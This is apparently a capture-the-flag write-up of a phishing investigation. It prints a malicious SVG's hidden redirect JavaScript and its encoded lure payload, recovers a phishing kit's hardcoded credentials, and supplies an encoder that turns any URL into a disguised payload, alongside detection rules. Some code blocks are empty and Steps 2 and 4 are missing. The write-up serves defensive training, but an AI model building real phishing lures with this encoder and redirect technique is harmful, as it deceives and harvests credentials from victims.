## Executive Summary

GreenBlueStone received a set of suspicious emails while the incident response team recovered a mysterious Linux binary from attacker infrastructure. The malicious attachment was an SVG file named `megacorpone_sales.svg`. It contained hidden JavaScript that waited 15 seconds, decoded a business-word payload into a URL, and redirected the victim browser to a lookalike Microsoft phishing domain:

```text

```

The framework credentials were recovered by static analysis of the Go ELF binary:


## How to Think About This Challenge

The key to this lab is not to treat the mailbox and the binary as separate puzzles. The prompt says to analyze **both** the captured phishing framework and the emails. That means the goal is correlation:

1. Use the mailbox to find all delivered attachments.
2. Use the binary to learn what kind of files the phishing framework can generate.
3. Match the generated file pattern back to one attachment.
4. Analyze that file for hidden redirect logic.
5. Reverse the framework enough to recover login credentials.
6. Reproduce the payload-generation logic for a new destination.

A good mental model is:

```text
Recovered framework -> tells us the generator behavior
Mailbox attachments -> show what was delivered to victims
Generated artifact  -> contains the hidden phishing redirect
Payload encoder     -> lets us create the defensive test payload
```

The trap is jumping straight to the most suspicious-looking attachment by extension. There were ZIP, ISO, RAR, 7z, PDF, PPT, and SVG attachments. The malicious file was not chosen because SVG is suspicious by itself; it was chosen because its internals matched the recovered framework.

## Step 1 - Extract Attachments From the Mailbox

The first job was to list every attachment and calculate its SHA256 hash. The mailbox had multiple possible phishing candidates, so hashing and naming everything gave us a clean evidence table.

Example extraction logic:

```python
import mailbox
import hashlib
from pathlib import Path

src = Path("Inbox-1")
out = Path("extracted_attachments")
out.mkdir(exist_ok=True)

for i, msg in enumerate(mailbox.mbox(src), 1):
    for part in msg.walk():
        filename = part.get_filename()
        if not filename:
            continue

        data = part.get_payload(decode=True)
        path = out / filename
        path.write_bytes(data)

        print(filename, len(data), hashlib.sha256(data).hexdigest())
```

## Step 3 - Identify the Malicious Attachment

The two SVG attachments were the strongest candidates because the framework had a dedicated SVG generator.

Searching the SVG files for hidden redirect behavior found that only `megacorpone_sales.svg` contained:

```text
hiddenAnalyticsText
businessTerminologyDecodingMapTable
window.location.href
```

The relevant hidden payload field was:

```xml
<text id="hiddenAnalyticsText"
      class="hiddenAnalyticsElement"
      data-analytics="revenue-operations-operations-risk-shares-quarterly-growth-growth-allocation-equity-governance-investment-retention-assets-margin-allocation-capital-forecast-equity-shares-equity-fiscal-operations-assets-capital-equity-margin">
  Hidden Analytics Metadata
</text>
```

The script waited 15 seconds, decoded the business terms, and redirected the browser:

```javascript
function executeDelayedBusinessDashboardInitialization6e9b2f() {
    const terms = document.getElementById('hiddenAnalyticsText').getAttribute('data-analytics');
    const url = decodeBusinessTerminologySequenceMappingb4c8e1(terms);
    window.location.href = url;
}

setTimeout(function scheduleEnterpriseNavigationWindowf5a6b7() {
    executeDelayedBusinessDashboardInitialization6e9b2f();
}, 15000);
```

That behavior made `megacorpone_sales.svg` the malicious file.

The domain is a lookalike of `microsoft.com`, but with `mlcrosoft` using a lowercase `l` after `m`.

## Step 5 - Recover the Framework Credentials

The binary could not be run directly on the Windows host because it was a Linux ELF and WSL was not installed. So the credentials were recovered through static analysis.

The useful clue was the embedded login code:

```text
/api/login
/api/check-auth
Invalid credentials
LOW ORBIT IMPLANT CREATOR
```

Using Go function metadata from `.gopclntab`, the login handler was identified:

```text
main.(*App).handleLogin
```

Disassembling that function showed two comparisons:

```text
username length: 8
username value : operator

password length: 19
password value : context.ContextName
```

Therefore the valid toolkit credentials were:

```text
operator:context.ContextName
```

This is a good example of why static analysis should focus on the function that enforces the decision, not just random strings. The binary contained many misleading strings from Go, SQLite, HTTP, SMTP, and Office libraries.

## Step 6 - Recreate the Payload for Defensive Testing

The fourth challenge question asked for the same filetype as the original malicious file with a new destination:

```text
https://phishing.megacorpone.com
```

Since the original malicious file was an SVG, the useful output was the new `data-analytics` payload that would decode to the new URL.

The encoder is simply the reverse of the decoder map:

```python
url = "https://phishing.megacorpone.com"

enc = {
    "h": "revenue",
    "t": "operations",
    "p": "risk",
    "s": "shares",
    ":": "quarterly",
    "/": "growth",
    ".": "assets",
    "c": "capital",
    "o": "equity",
    "m": "margin",
    "a": "audit",
    "r": "forecast",
    "e": "budget",
    "d": "expenses",
    "i": "investment",
    "n": "retention",
    "f": "fiscal",
    "g": "governance",
    "l": "allocation"
}

payload = "-".join(enc[ch] for ch in url)
print(payload)
```

Generated payload:

```text
revenue-operations-operations-risk-shares-quarterly-growth-growth-risk-revenue-investment-shares-revenue-investment-retention-governance-assets-margin-budget-governance-audit-capital-equity-forecast-risk-equity-retention-budget-assets-capital-equity-margin
```

Verification:

```text
decoded = https://phishing.megacorpone.com
```

## Detection and Defensive Lessons

This challenge is also about building future alerts, not only solving the four answers.

Useful detection ideas:

| Detection | Why it works |
|:----------|:-------------|
| SVG attachments containing `<script>` | Most business SVG attachments should not execute JavaScript |
| SVG with delayed redirect logic such as `setTimeout` and `window.location.href` | Strong indicator of browser-based lure behavior |
| Hidden SVG elements with suspicious custom data attributes | The payload was hidden in `data-analytics` |
| Lookalike domains such as `mlcrosoft.com` | Common phishing tactic using visual similarity |
| Generated strings like `Generated by LOW ORBIT FILE CREATOR` | Framework-specific indicator |
| Mail from external domains with business-themed attachments | The malicious SVG came from a sales-themed lure |

Example YARA-style logic for the SVG family:

```text
condition:
  file extension is .svg
  and contains "businessTerminologyDecodingMapTable"
  and contains "hiddenAnalyticsText"
  and contains "window.location.href"
  and contains "setTimeout"
```

---

## Mistakes to Avoid

1. **Do not trust file extensions alone.** The archive and ISO attachments looked suspicious, but the framework evidence pointed to SVG generation.
2. **Do not stop at visible SVG content.** The chart/dashboard visuals were camouflage; the payload lived in hidden attributes and JavaScript.
3. **Do not search Go strings randomly forever.** Go binaries are noisy. Find application-specific package names and then target the relevant function.
4. **Do not submit the decoded URL if the question asks for embedded payload/data.** In this lab, the embedded data was the hyphenated business-term sequence.
5. **Do not assume the phishing framework was sophisticated.** The conclusion confirms it was an AI-generated, purchased phishing-framework-as-a-service kit with little customization.
